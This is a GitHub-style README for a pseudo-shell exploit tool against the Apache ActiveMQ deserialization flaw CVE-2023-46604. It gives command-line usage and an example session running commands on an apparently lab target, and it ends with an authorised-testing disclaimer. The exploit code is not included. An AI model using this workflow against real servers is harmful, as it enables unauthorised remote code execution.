# CVE-2023-46604 RCE Pseudoshell

This script leverages CVE-2023046604 (Apache ActiveMQ) to generate a pseudo shell. The vulnerability allows for remote code execution due to unsafe deserialization within the OpenWire protocol.


## Description

CVE-2023-46604 is a deserialization vulnerability that exists in Apache ActiveMQ's OpenWire protocol. This flaw can be exploited by an attacker to execute arbitrary code on the server where ActiveMQ is running. An attacker can craft a malicious xml file, commands from which will be executed by the remote server. 

This explot automates and abstracts the process of xml document creation, provides a basic server to deliver the file and receives information back from the target server via POST. This allows continued exploitation without the need to invoke a reverse shell, or deploy a binary. 


## Prerequisites

Before running the exploit script, ensure that you have:

- Python 3.x installed on your system.
- Network access to the vulnerable ActiveMQ server.
- Permssion to test against the vulnerable server. 


## Usage

The script requires:
- ActiveMQ Server IP or Hostname
- Serve IP (An IP on your system, reachable by the target.)

Optional:
- ActiveMQ Server Port - defaults to 61616
- Serve port (The port to start the local server on) - defaults to 8080

```
usage: exploit.py [-h] -i IP [-p PORT] -si SRVIP [-sp SRVPORT]

optional arguments:
  -h, --help            show this help message and exit
  -i IP, --ip IP        ActiveMQ Server IP or Hostname
  -p PORT, --port PORT  ActiveMQ Server Port, defaults to 61616
  -si SRVIP, --srvip SRVIP
                        Serve IP
  -sp SRVPORT, --srvport SRVPORT
                        Serve port, defaults to 8080

```

## Example

```
$python3 exploit.py -i 10.129.230.87 -p 61616  -si 10.10.14.59 -sp 8080
#################################################################################
#  CVE-2023-46604 - Apache ActiveMQ - Remote Code Execution - Pseudo Shell      #
#  Exploit by Ducksec, Original POC by X1r0z, Python POC by evkl1d              #
#################################################################################

[*] Target: 10.129.230.87:61616
[*] Serving XML at: http://10.10.14.59:8080/poc.xml
[!] This is a semi-interactive pseudo-shell, you cannot cd, but you can ls-lah / for example.
[*] Type 'exit' to quit

#################################################################################
# Not yet connected, send a command to test connection to host.                 #
# Prompt will change to Apache ActiveMQ$ once at least one response is received #
# Please note this is a one-off connection check, re-run the script if you      #
# want to re-check the connection.                                              #
#################################################################################

[Target not responding!]$ whoami
activemq

Apache ActiveMQ$ ls -lah
total 164K
drwxr-xr-x  5 activemq activemq 4.0K Nov  7 12:50 .
drwxr-xr-x 11 activemq activemq 4.0K Nov  6 01:18 ..
-rwxr-xr-x  1 activemq activemq  21K Apr 20  2021 activemq
-rwxr-xr-x  1 activemq activemq 6.1K Apr 20  2021 activemq-diag
-rw-r--r--  1 activemq activemq  17K Apr 20  2021 activemq.jar
-rw-r--r--  1 activemq activemq 5.5K Apr 20  2021 env
drwxr-xr-x  2 activemq activemq 4.0K Nov  5 00:13 linux-x86-32
drwxr-xr-x  2 activemq activemq 4.0K Nov  5 00:13 linux-x86-64
drwxr-xr-x  2 activemq activemq 4.0K Nov  5 00:13 macosx
-rw-r--r--  1 activemq activemq  82K Apr 20  2021 wrapper.jar

Apache ActiveMQ$ 
```
[CVE-2023-46604-RCE.webm](https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell/assets/129839654/38f280fa-2252-4161-acb3-9b92d3635eac)


## Credits
This exploit builds on the oiringal POC in Go by [X1r0z](https://github.com/X1r0z/ActiveMQ-RCE) and Python POC by [evkl1d](https://github.com/evkl1d/CVE-2023-46604).

## Disclaimer

This code is provided for educational and ethical security testing purposes only. It should be used responsibly and only in environments where explicit authorization has been granted. Unauthorized or malicious use is strictly prohibited. By using this code, you agree to adhere to all applicable laws, regulations, and ethical standards applicable in your jurisdiction. The creators and contributors disclaim any liability for any damages or consequences arising from the misuse or unauthorized use of this code.

